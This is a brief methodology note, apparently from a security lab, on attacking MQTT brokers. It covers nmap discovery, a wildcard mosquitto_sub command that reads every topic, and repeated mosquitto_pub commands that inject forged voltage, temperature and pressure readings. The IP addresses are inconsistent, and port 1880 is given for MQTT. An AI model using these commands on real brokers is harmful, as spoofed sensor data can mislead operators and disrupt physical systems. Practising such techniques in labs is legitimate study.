methodlogy
mqtt:
discover with nmap (look for 1880)
perform wildcard subscription to view alerts (and validate our own)
`mosquitto_sub -t "#" -h 192.94.218.3 -v`  
now if we either have credentials or if there is weak security we can publish our own updates to sensors
`mosquitto_pub -t "sensor" -m '{"voltage":"228.703144053156","temperature":"37.42692765207313","pressure":"50.8083798170982"}' -h 192.94.128.3`  
`mosquitto_pub -t "sensor" -m '{"voltage":"228.703144053156","temperature":"37.42692765207313","pressure":"50.8083798170982"}' -h 192.94.128.3`  
